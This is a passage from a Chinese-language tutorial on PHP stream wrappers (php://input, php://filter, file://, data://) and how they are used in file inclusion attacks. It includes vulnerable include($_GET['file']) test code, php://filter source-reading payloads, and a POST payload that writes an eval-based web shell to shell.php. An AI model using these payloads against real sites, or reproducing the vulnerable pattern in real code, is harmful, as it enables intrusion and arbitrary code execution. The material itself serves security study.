&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//open our file pointer to read from stdin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 读取&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到打开了一个文件指针进行读取&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdout&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdout&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;这是一个测试&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
可以看到打开了一个文件指针进行写入&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stderr&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stderr&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;lalala&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到打开了一个文件指针进行写入&lt;/p&gt;
&lt;h2 id=&#34;phpinput&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput&#34;&gt;#&lt;/a&gt; php://input&lt;/h2&gt;
&lt;p&gt;php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。&lt;br /&gt;
&lt;span class=&#34;label warning&#34;&gt;注：enctype=”multipart/form-data” 的时候 php://input 是无效的。&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinput-读取post数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput-读取post数据&#34;&gt;#&lt;/a&gt; php://input （读取 POST 数据）&lt;/h3&gt;
&lt;p&gt;碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；&lt;/p&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# 1.php文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;访问 &lt;code&gt;http://192.168.199.130/1.php&lt;/code&gt; burp 抓包，添加 post 数据。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;结果&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinput写马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput写马&#34;&gt;#&lt;/a&gt; php://input 写马&lt;/h3&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;条件：&lt;ins&gt;php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &amp;lt; 5.3.0）&lt;/ins&gt;, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。&lt;/p&gt;
&lt;p&gt;如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php @eval($_POST[cmd])?&amp;gt;&#39;);?&amp;gt;&lt;/code&gt; &lt;br /&gt;
&lt;span class=&#34;lebal info&#34;&gt; 图片&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;当 allow_url_include=Off 时是不行的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image023.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinput命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput命令执行&#34;&gt;#&lt;/a&gt; php://input 命令执行&lt;/h3&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;条件：&lt;ins&gt;php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &amp;lt; 5.30）&lt;/ins&gt;, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；&lt;br /&gt;
&lt;span class=&#34;lebal info&#34;&gt;图片&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image024.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;phpfilter本地磁盘文件进行读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpfilter本地磁盘文件进行读取&#34;&gt;#&lt;/a&gt; php://filter（本地磁盘文件进行读取）&lt;/h2&gt;
&lt;p&gt;元封装器，设计用于 &amp;quot;数据流打开&amp;quot; 时的 &amp;quot;筛选过滤&amp;quot; 应用，对本地磁盘文件进行读写。&lt;/p&gt;
&lt;p&gt;用法：&lt;br /&gt;
 &lt;code&gt;?filename=php://filter/convert.base64-encode/resource=xxx.php&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;?filename=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/code&gt;  一样。&lt;/p&gt;
&lt;p&gt;条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；&lt;/p&gt;
&lt;p&gt;php://filter 参数&lt;/p&gt;
&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;名称&lt;/th&gt;
        &lt;th&gt;描述&lt;/th&gt;
        &lt;th&gt;备注&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;resource=&amp;lt;要过滤的数据流&amp;gt;&lt;/td&gt;
        &lt;td&gt;指定了你要筛选过滤的数据流。&lt;/td&gt;
        &lt;td&gt;必选&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;read=&amp;lt;读链的筛选列表&amp;gt;&lt;/td&gt;
        &lt;td&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;/td&gt;
        &lt;td&gt;可选&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;write=&amp;lt;写链的筛选列表&amp;gt;&lt;/td&gt;
        &lt;td&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;/td&gt;
        &lt;td&gt;可选&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;&amp;lt;；两个链的筛选列表&amp;gt;&lt;/td&gt;
        &lt;td&gt;任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。&lt;/td&gt;
        &lt;td&gt;&amp;nbsp;&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;过滤器详解&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=&#34;&gt; https://blog.csdn.net/ni9htmar3/article/details/69812306#t8&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;file伪协议读取文件内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file伪协议读取文件内容&#34;&gt;#&lt;/a&gt; file:// 伪协议 (读取文件内容)&lt;/h2&gt;
&lt;p&gt;通过 file 协议可以访问本地文件系统，读取到文件的内容&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image025.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;data伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#data伪协议&#34;&gt;#&lt;/a&gt; data:// 伪协议&lt;/h2&gt;
&lt;p&gt;数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  &lt;code&gt;data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;data://（读取文件）&lt;br /&gt;
和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； &lt;?php // 打印 &#34;I love PHP&#34; echo file_get_contents(&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;); ?&gt;&lt;/p&gt;
&lt;p&gt;注意：&amp;lt;span style=&amp;quot;color: rgb (121, 121, 121);&amp;quot;&amp;gt;&amp;lt;?php phpinfo ();, 这类执行代码最后没有？&amp;gt;&amp;lt;/span &amp;gt; 闭合；&lt;/p&gt;
&lt;p&gt;如果 php.ini 里的 allow_url_include=On（PHP &amp;lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token 